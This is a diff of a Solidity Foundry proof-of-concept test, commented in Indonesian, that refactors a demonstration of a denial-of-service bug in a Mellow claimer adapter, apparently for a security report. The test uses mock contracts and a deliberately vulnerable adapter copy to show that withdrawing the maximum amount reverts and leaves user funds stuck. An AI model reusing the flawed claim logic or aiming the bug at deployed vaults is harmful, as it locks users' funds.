@@ -26,23 +26,17 @@ contract MockMellowClaimer {
     }
 }
 
-// Test Contract untuk membuktikan bug di MellowClaimerAdapter
-contract MellowClaimerDoSTest is Test {
-    uint256 constant MAX_ASSETS_BUFFER = 100; // Konstanta dari adapter asli
+// Kontrak eksternal untuk menampung logika agar vm.expectRevert berfungsi normal
+contract VulnerableMellowAdapter {
+    uint256 public constant MAX_ASSETS_BUFFER = 100;
     error InsufficientClaimedException();
 
-    MockAsset public asset;
-    MockMellowClaimer public claimer;
-    
-    address creditAccount = address(this);
-
-    function setUp() public {
-        asset = new MockAsset();
-        claimer = new MockMellowClaimer(asset);
-    }
-
-    // Reproduksi exact logic dari MellowClaimerAdapter._claim()
-    function _claimLogic(uint256 maxAssets) internal {
+    function claimLogic(
+        MockAsset asset,
+        MockMellowClaimer claimer,
+        address creditAccount,
+        uint256 maxAssets
+    ) external {
         uint256 assetBalanceBefore = asset.balanceOf(creditAccount);
         
         // External call ke Mellow (hanya klaim yang mature)
@@ -58,6 +52,20 @@ contract MellowClaimerDoSTest is Test {
         }
         // =============================
     }
+}
+
+contract MellowClaimerDoSTest is Test {
+    MockAsset public asset;
+    MockMellowClaimer public claimer;
+    VulnerableMellowAdapter public adapter;
+    
+    address creditAccount = address(this);
+
+    function setUp() public {
+        asset = new MockAsset();
+        claimer = new MockMellowClaimer(asset);
+        adapter = new VulnerableMellowAdapter();
+    }
 
     function test_PoC_EndToEnd_MellowClaimerDoS() public {
         // 1. BEFORE EXPLOIT: Setup state Mellow Vault
@@ -65,6 +73,9 @@ contract MellowClaimerDoSTest is Test {
         uint256 pendingAssets = 1000e18;
         uint256 claimableAssets = 10e18;
         claimer.setClaimableAmount(claimableAssets);
+
+        // Cek saldo awal (Before)
+        assertEq(asset.balanceOf(creditAccount), 0, "Initial balance should be 0");
 
         // 2. SIMULASI GEARBOX CREDIT FACADE
         // User memanggil withdrawCollateral(phantomToken, type(uint256).max)
@@ -74,11 +85,11 @@ contract MellowClaimerDoSTest is Test {
 
         // 3. EXECUTION & IMPACT
         // Kita expect transaksinya REVERT karena maxAssets jauh lebih besar dari assets yang diterima
-        vm.expectRevert(InsufficientClaimedException.selector);
-        _claimLogic(maxAssetsRequestedByGearbox);
+        vm.expectRevert(VulnerableMellowAdapter.InsufficientClaimedException.selector);
+        adapter.claimLogic(asset, claimer, creditAccount, maxAssetsRequestedByGearbox);
 
         // 4. AFTER EXPLOIT VERIFICATION
-        // Cek apakah dana user benar-benar terkunci (balance tetap 0)
+        // Cek apakah dana user benar-benar terkunci (balance tetap 0 meskipun ada 10e18 yang claimable)
         assertEq(asset.balanceOf(creditAccount), 0, "User funds are stuck! DoS Confirmed.");
     }
 }
